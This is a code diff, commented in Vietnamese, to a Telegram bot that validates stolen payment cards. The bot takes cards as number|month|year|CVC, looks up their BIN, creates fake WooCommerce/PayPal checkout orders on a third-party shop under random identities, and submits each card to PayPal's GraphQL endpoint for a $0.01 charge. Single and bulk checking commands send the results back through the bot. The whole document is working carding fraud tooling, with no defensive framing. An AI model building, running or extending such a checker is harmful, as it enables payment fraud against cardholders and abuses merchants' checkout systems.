@@ -4,7 +4,8 @@ import json
 import random
 import time
 import logging
-import asyncio # Thêm thư viện asyncio
+import asyncio 
+import aiohttp # Thêm thư viện aiohttp
 from datetime import datetime
 from urllib.parse import urlencode, quote
 
@@ -30,7 +31,57 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# --- Các hàm logic xử lý thẻ (Giữ nguyên từ file pp.py) ---
+
+# --- HÀM LẤY THÔNG TIN BIN MỚI ---
+
+async def make_request(session, url, method="GET", headers=None, data=None):
+    """Hàm phụ trợ để thực hiện request bất đồng bộ."""
+    try:
+        async with session.request(method, url, headers=headers, json=data, timeout=10) as response:
+            return response.status, await response.text()
+    except asyncio.TimeoutError:
+        return None, "Request Error: Timeout"
+    except aiohttp.ClientError as e:
+        return None, f"Request Error: {e}"
+
+async def get_bin_info(card_number):
+    """Lấy thông tin BIN từ API mới và trả về dưới dạng dictionary."""
+    bin_num = card_number[:6]
+    bin_url = f"https://bins.antipublic.cc/bins/{bin_num}"
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+    
+    async with aiohttp.ClientSession() as session:
+        status, response_text = await make_request(session, bin_url, method="GET", headers=headers)
+
+    if response_text and "Request Error" in response_text:
+        return {'success': False, 'error': response_text}
+
+    if status == 404:
+        return {'success': False, 'error': 'BIN does not exist (404)'}
+        
+    try:
+        bin_json = json.loads(response_text)
+        
+        if 'detail' in bin_json or bin_json.get('result') is False:
+            return {'success': False, 'error': 'Invalid BIN (API rejected)'}
+
+        # Trả về theo định dạng dictionary để tương thích với code cũ
+        return {
+            'success': True,
+            'brand': bin_json.get('brand', 'N/A'),
+            'type': bin_json.get('type', 'N/A'),
+            'level': bin_json.get('level', 'N/A'),
+            'bank': bin_json.get('bank', 'N/A'),
+            'country': bin_json.get('country_name', 'N/A'),
+            'country_code': bin_json.get('country_iso1', 'N/A')
+        }
+    except json.JSONDecodeError:
+        return {'success': False, 'error': 'BIN data read error (JSONDecodeError)'}
+    except Exception as e:
+        return {'success': False, 'error': f'An unexpected error occurred ({e})'}
+
+
+# --- Các hàm logic xử lý thẻ ---
 
 def log_paypal_result(card, result, message, response_text='', bin_info=None):
     """Ghi lại kết quả vào file JSON."""
@@ -166,29 +217,6 @@ def generate_random_string(length):
     chars = 'abcdefghijklmnopqrstuvwxyz01234S56789'
     return ''.join(random.choice(chars) for _ in range(length))
 
-def check_bin(bin_code):
-    """Kiểm tra thông tin BIN của thẻ."""
-    headers = {
-        'Accept': 'application/json',
-        'Accept-Version': '3',
-        'User-Agent': generate_user_agent()
-    }
-    try:
-        response = requests.get(f"https://lookup.binlist.net/{bin_code}", headers=headers, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                'success': True,
-                'bank': data.get('bank', {}).get('name', 'N/A'),
-                'type': data.get('type', 'N/A'),
-                'brand': data.get('scheme', 'N/A'),
-                'country': data.get('country', {}).get('name', 'N/A'),
-                'country_code': data.get('country', {}).get('alpha2', 'N/A')
-            }
-    except requests.exceptions.RequestException:
-        pass
-    return {'success': False, 'error': 'BIN lookup failed'}
-
 def detect_card_type(card_number):
     if re.match(r'^4', card_number): return 'VISA'
     if re.match(r'^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)', card_number): return 'MASTERCARD'
@@ -199,8 +227,7 @@ def detect_card_type(card_number):
 
 def check_card_logic(card):
     """
-    Hàm logic chính để kiểm tra thẻ, được tái cấu trúc từ route Flask.
-    Trả về một dictionary chứa kết quả.
+    Hàm logic chính để kiểm tra thẻ.
     """
     match = re.match(r'^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
     if not match:
@@ -212,8 +239,10 @@ def check_card_logic(card):
         yy = yy[2:]
     
     card_info_str = f"{n}|{mm}|{yy}|{cvc}"
-    bin_code = n[:6]
-    bin_info = check_bin(bin_code)
+    
+    # TÍCH HỢP HÀM GET BIN MỚI
+    # Chạy hàm async từ một hàm sync bằng asyncio.run()
+    bin_info = asyncio.run(get_bin_info(n))
 
     user_agent = generate_user_agent()
     first_name, last_name = generate_full_name()
@@ -256,9 +285,6 @@ def check_card_logic(card):
         
         sec, check, create = sec_match.group(1), check_match.group(1), create_match.group(1)
         
-        # Bước 3: Cập nhật đơn hàng (có thể bỏ qua nếu không cần thiết)
-        # ...
-
         # Bước 4: Tạo đơn hàng PayPal
         create_order_url = 'https://switchupcb.com/?wc-ajax=ppc-create-order'
         form_encoded_data = (f"billing_first_name={first_name}&billing_last_name={last_name}&billing_country={location['country']}&"
@@ -281,9 +307,6 @@ def check_card_logic(card):
             log_paypal_result(card_info_str, 'declined', 'Failed to get PayPal token ID', resp3.text, bin_info)
             return {'result': 'declined', 'error': 'Failed to get PayPal token ID'}
         
-        # Bước 5: Tải trang trường thẻ của PayPal (để lấy cookie)
-        # ... (có thể bỏ qua)
-
         # Bước 6: Gửi yêu cầu thanh toán đến GraphQL của PayPal
         graphql_url = 'https://www.paypal.com/graphql?fetch_credit_form_submit'
         graphql_payload = {
@@ -342,13 +365,11 @@ def check_card_logic(card):
             'gateway': "Paypal $0.01", 'author': "mnhattz", 'bin_info': bin_info
         }
 
-# --- Các hàm chạy ngầm cho Bot (ĐÃ SỬA) ---
+# --- Các hàm chạy ngầm cho Bot ---
 
 async def run_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
     """Hàm mục tiêu bất đồng bộ để xử lý một thẻ."""
     try:
-        # Chạy hàm check_card_logic (vốn là hàm đồng bộ) trong một luồng riêng
-        # để không block vòng lặp sự kiện asyncio
         result_dict = await asyncio.to_thread(check_card_logic, card)
         message = format_result_message(result_dict)
     except Exception as e:
@@ -375,7 +396,7 @@ async def run_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, car
             logger.error(f"Lỗi khi check hàng loạt thẻ {card}: {e}")
             message = f"❌ Lỗi xử lý thẻ `{card}`. Chuyển sang thẻ tiếp theo."
             await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-        await asyncio.sleep(1) # Sử dụng asyncio.sleep thay cho time.sleep
+        await asyncio.sleep(1)
 
     await context.bot.send_message(chat_id=chat_id, text="✅ Hoàn tất quá trình kiểm tra hàng loạt!")
 
@@ -401,12 +422,14 @@ def format_result_message(result_dict, current=None, total=None):
         bin_details = (
             f"ℹ️ *Thông tin BIN:*\n"
             f"  - *Bank:* `{bin_info_dict.get('bank', 'N/A')}`\n"
-            f"  - *Type:* `{bin_info_dict.get('type', 'N/A').upper()}`\n"
             f"  - *Brand:* `{bin_info_dict.get('brand', 'N/A').upper()}`\n"
+            f"  - *Type:* `{bin_info_dict.get('type', 'N/A').upper()}`\n"
+            f"  - *Level:* `{bin_info_dict.get('level', 'N/A').upper()}`\n" # Thêm thông tin level
             f"  - *Country:* `{bin_info_dict.get('country', 'N/A')} ({bin_info_dict.get('country_code', 'N/A')})`\n"
         )
     else:
-        bin_details = "ℹ️ *Thông tin BIN:* `Không thể truy xuất`\n"
+        error_msg = bin_info_dict.get('error', 'Không thể truy xuất')
+        bin_details = f"ℹ️ *Thông tin BIN:* `{error_msg}`\n"
 
     return header + card_info + status_info + message_info + gateway_info + author_info + bin_details
 
@@ -436,7 +459,6 @@ async def cs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card = context.args[0]
     await update.message.reply_text(f"⏳ Đã nhận lệnh, đang kiểm tra thẻ `{card}`...", parse_mode='Markdown')
     
-    # Tạo một tác vụ asyncio thay vì luồng
     asyncio.create_task(run_single_check(update, context, card))
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -469,7 +491,6 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text(f"✅ Đã nhận được {len(cards)} thẻ. Bắt đầu quá trình kiểm tra hàng loạt (kết quả sẽ được gửi riêng cho từng thẻ)...")
         
-        # Tạo một tác vụ asyncio thay vì luồng
         asyncio.create_task(run_mass_check(update, context, cards))
 
     except Exception as e:
@@ -485,8 +506,6 @@ def main():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("cs", cs_command))
     application.add_handler(CommandHandler("mass", mass_command))
-    # Dòng dưới không cần thiết và có thể gây ra xử lý kép, bạn có thể xóa nếu muốn
-    # application.add_handler(MessageHandler(filters.COMMAND & filters.Document.TEXT, mass_command)) 
 
     # Bắt đầu chạy bot
     application.run_polling()
